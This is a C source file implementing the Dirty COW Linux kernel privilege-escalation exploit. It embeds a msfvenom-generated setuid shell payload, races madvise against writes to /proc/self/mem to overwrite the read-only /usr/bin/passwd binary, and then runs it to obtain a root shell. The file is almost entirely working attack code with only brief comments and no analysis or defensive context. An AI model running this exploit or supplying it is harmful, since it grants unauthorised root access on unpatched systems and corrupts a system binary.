#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

int stopExecution;

void* mapedFileInMemory;
pthread_t threadChecker, threadDeallocator, threadWritter;

int fileToChangeDescriptor;
struct stat fileToChangeStats;
char fileToChange[] = "/usr/bin/passwd";
char* newFileToChangeContent;

// What is this?
// Source code generated by 'msfvenom'

// Excatly: 'msfvenom -p linux/x64/exec CMD="echo '0' > /proc/sys/vm/dirty_writeback_centisecs;/bin/bash" PrependSetuid=True -f elf | xxd -i'

char sourceCode[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xe3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4e, 0x01, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
  0x3c, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x27, 0x30, 0x27,
  0x20, 0x3e, 0x20, 0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x79, 0x73,
  0x2f, 0x76, 0x6d, 0x2f, 0x64, 0x69, 0x72, 0x74, 0x79, 0x5f, 0x77, 0x72,
  0x69, 0x74, 0x65, 0x62, 0x61, 0x63, 0x6b, 0x5f, 0x63, 0x65, 0x6e, 0x74,
  0x69, 0x73, 0x65, 0x63, 0x73, 0x3b, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62,
  0x61, 0x73, 0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sourceCodeLength = 227;

void MarkMemoryEmpty()
{
    while (1)
    {
        if (stopExecution == 1)
            break;

        madvise(mapedFileInMemory, 100, MADV_DONTNEED);
    }

}

void WriteInFileOnMemory()
{
    int selfMem = open("/proc/self/mem", O_RDWR);

    while(1)
    {
        if (stopExecution == 1)
            break;
        
        lseek(selfMem, (__off_t)mapedFileInMemory, SEEK_SET);
        write(selfMem, sourceCode, sourceCodeLength);
    }
}

void CheckIfProcessIsDone()
{
    char* buffer = malloc((sourceCodeLength + 1) * sizeof(char));
    while(1)
    {
        if (stopExecution == 1)
            break;

        FILE* fileToCheckIfChanged = fopen(fileToChange, "rb");

        fread(buffer, sourceCodeLength, 1, fileToCheckIfChanged);

        if (memcmp(buffer, newFileToChangeContent, sourceCodeLength) == 0)
        {
            printf("DONE!!!!\n");
            stopExecution = 1;
        }

        fclose(fileToCheckIfChanged);
        sleep(1);
    }
    free(buffer);
}

void StartDirtyCow() 
{
    fileToChangeDescriptor = open(fileToChange, O_RDONLY);
    fstat(fileToChangeDescriptor, &fileToChangeStats);

    newFileToChangeContent = malloc((fileToChangeStats.st_size + sizeof(long))*sizeof(char));
    memset(newFileToChangeContent, 0x90, fileToChangeStats.st_size);
    memcpy(newFileToChangeContent, sourceCode, sourceCodeLength+1);

    mapedFileInMemory = mmap(NULL, fileToChangeStats.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, fileToChangeDescriptor, 0);

    stopExecution = 0;
    pthread_create(&threadDeallocator, NULL, MarkMemoryEmpty, NULL);
    pthread_create(&threadWritter, NULL, WriteInFileOnMemory, NULL);   
    pthread_create(&threadChecker, NULL, CheckIfProcessIsDone, NULL);

    pthread_join(threadChecker, NULL);
    pthread_join(threadDeallocator, NULL);
    pthread_join(threadWritter, NULL);

    system(fileToChange);
}

void BackUpFile()
{
    char* backupFileName;

    asprintf(&backupFileName, "cp %s /tmp/dirtyCowBackUp", fileToChange);
    system(backupFileName);
}

int main()
{
    // Make a backup of file

    BackUpFile();
    StartDirtyCow();

    return 0;
}
